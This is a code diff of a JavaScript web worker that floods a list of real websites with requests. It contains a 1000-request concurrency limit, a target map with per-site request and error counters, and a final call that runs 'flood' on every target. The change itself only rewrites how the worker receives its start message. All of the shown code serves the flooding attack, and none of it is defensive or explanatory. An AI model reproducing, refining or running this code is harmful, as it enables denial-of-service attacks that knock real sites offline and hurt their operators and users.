@@ -1,3 +1,4 @@
+onmessage = function(e) {
 var CONCURRENCY_LIMIT = 1000;
 var queue = [];
 
@@ -49,8 +50,6 @@ var targets = {
   "https://www.eurosib.ru/": { "number_of_requests": 0, "number_of_errored_responses": 0, "label": "Interfax.com.ua" },
   "https://ugmk.ua/": { "number_of_requests": 0, "number_of_errored_responses": 0, "label": "Enovosty.com" }
 }
-
-self.addEventListener('message', async (e) => {
   async function fetchWithTimeout(resource, options) {
     const controller = new AbortController();
     const id = setTimeout(() => controller.abort(), options.timeout);
@@ -93,4 +92,4 @@ self.addEventListener('message', async (e) => {
   }
   // Start
   Object.keys(targets).map(flood);
-})
+};
